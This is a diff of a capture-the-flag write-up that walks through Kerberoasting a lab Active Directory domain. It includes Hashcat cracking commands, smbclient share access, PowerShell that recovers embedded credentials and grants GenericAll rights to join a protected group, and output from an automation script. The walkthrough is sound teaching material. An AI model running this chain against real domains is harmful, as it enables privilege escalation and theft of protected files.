@@ -30,15 +30,15 @@ We prepare a password list using CeWL, keeping in mind that explicitly also digi
 <p>In addition, also following the hint, the OneRuleToRuleThemAll rule for Hashcat is downloaded:</p>
 <pre><code>curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
 </code></pre>
-<p>Equipped with these tool, we can let Hashcat crack the password:</p>
+<p>Equipped with these tools, we can let Hashcat crack the password:</p>
 <pre><code>hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist
 </code></pre>
-<p>Hashcat find the password for <code>elfu_svc</code> to be <code>Snow2021!</code>.</p>
+<p>Hashcat finds the password for <code>elfu_svc</code> to be <code>Snow2021!</code>.</p>
 <h3 id="access-to-elfu_svc_shr">Access to elfu_svc_shr</h3>
 <p>With this information we can get access to the elfu_svc_shr file share in 10.128.3.30:</p>
 <pre><code>smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
 </code></pre>
-<p>On this share are several Powershell scripts. One of them, <code>GetProcessInfo.ps1</code> holds credentials for the <code>user remote_elf</code>:</p>
+<p>On this share are several Powershell scripts. One of them, <code>GetProcessInfo.ps1</code> holds credentials for the user <code>remote_elf</code>:</p>
 <pre><code>$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
 $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
 $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
@@ -46,49 +46,97 @@ $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("el
 <h3 id="getting-into-group-research-department">Getting into group Research Department</h3>
 <p>With the <code>remote_elf</code> credential snippet from the script, we can grant our windows domain user the <code>GenericAll</code> permissions for the group Research Department:</p>
 <pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
-Add-Type -AssemblyName System.DirectoryServices
-$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
-$username = "{userid}"
-$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
-$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
-$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
-$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
-$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
-$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
-$secOptions = $domainDirEntry.get_Options()
-$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
-$domainDirEntry.RefreshCache()
-$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
-$domainDirEntry.CommitChanges()
-$domainDirEntry.dispose()
+  Add-Type -AssemblyName System.DirectoryServices
+  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+  $username = "{userid}"
+  $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+  $propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+  $IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+  $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+  $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+  $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+  $secOptions = $domainDirEntry.get_Options()
+  $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+  $domainDirEntry.RefreshCache()
+  $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+  $domainDirEntry.CommitChanges()
+  $domainDirEntry.dispose()
 } -Credential $aCred -Authentication Negotiate
 </code></pre>
 <p>and add then our user to this group:</p>
 <pre><code>Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock {
-Add-Type -AssemblyName System.DirectoryServices
-$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
-$username = "ptsuxvdegy"
-$password = "Scumpfccr#"
-$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
-$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
-$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
-$b=New-Object byte[] $sid.BinaryLength
-$sid.GetBinaryForm($b,0)
-$hexSID=[BitConverter]::ToString($b).Replace('-','')
-$domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
-$domainDirEntry.CommitChanges()
-$domainDirEntry.dispose()
-
+  Add-Type -AssemblyName System.DirectoryServices
+  $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+  $username = "{userid}"
+  $password = "{password}"
+  $domainDirEntry = New-Object   System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+  $user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+  $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+  $b=New-Object byte[] $sid.BinaryLength
+  $sid.GetBinaryForm($b,0)
+  $hexSID=[BitConverter]::ToString($b).Replace('-','')
+  $domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
+  $domainDirEntry.CommitChanges()
+  $domainDirEntry.dispose()
 } -Credential $aCred -Authentication Negotiate
 </code></pre>
 <h3 id="access-to-research_dep-share">Access to research_dep share</h3>
 <p>After a few minutes, our new group membership gets replicated to the samba file server, so that we now have access to the secret document:</p>
 <pre><code>smbclient '\\10.128.3.30\research_dep'
 smb: \&gt; dir
-. D 0 Thu Dec 2 16:39:42 2021
-.. D 0 Mon Dec 20 08:01:35 2021
-SantaSecretToAWonderfulHolidaySeason.pdf N 173932 Thu Dec 2 16:38:26 2021
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Dec 24 08:01:27 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34373492 blocks available
 </code></pre>
-<p>The PDF document lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
+<p>The <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Objective-8/SantaSecretToAWonderfulHolidaySeason.pdf">PDF document</a> lists <strong>Kindness</strong> as first secret ingredient for a wonderful holiday season.</p>
+<hr>
+<h3 id="bonus-automation---kerberoboting">Bonus: Automation - Kerberoboting</h3>
+<p>This whole process was automated in an <code>expect</code> script named <code>kerberoboting</code>, so that you can enjoy a brew whilst your computer does the work.<br>
+It just requires you to register at <a href="https://register.elfu.org">https://register.elfu.org</a>, have <code>hashcat</code> installed in the PATH and a working CeWL in the local directory:</p>
+<pre><code>joergen@northpole:~$ ./kerberoboting jsfdgdsjjl 'Ndcopkmbo#'
+#
+# Kerberoboting in progress - get a brew and lean back
+#
+
+Retrieving the wordlist from register.elfu.org using CeWL
+Retrieving the OneRuleToRuleThemAll rule for Hashcat
+Logging on to grades.elfu.org using SSH
+Escaping the application using &lt;EOF&gt;
+Escaping the Python shell using os.system('bash')
+These shares are available on the file server
+smbclient -L '\\\\10.128.3.30'
+Enter WORKGROUP\jsfdgdsjjl's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk      
+	sysvol          Disk      
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+Running GetUserSPNs.py using my user id to enumerate SPNs linked to user accounts and get their password hashes
+Running Hashcat to crack the password
+  ok. Password is Snow2021!
+Getting access to samba \\\\10.128.3.30\elfu_svc_shr share as user elfu_svc
+Obtaining file GetProcessInfo.ps1 which has credentials for remote_elf embedded
+Granting myself GenericAll permissions on AD group Research Department and adding myself to it
+Getting access to samba \\\\10.128.3.30\research_dep using my user id
+dir
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Fri Dec 24 08:01:27 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34373492 blocks available
+smb: \\&gt; Getting file SantaSecretToAWonderfulHolidaySeason.pdf
+Transferring file SantaSecretToAWonderfulHolidaySeason.pdf to local machine
+
+\#
+\# Have fun and explore more
+\#
+
+jsfdgdsjjl@grades:~$ 
+</code></pre>
 <p><strong>Achievement: Kerberoasting on an Open Fire</strong></p>
 
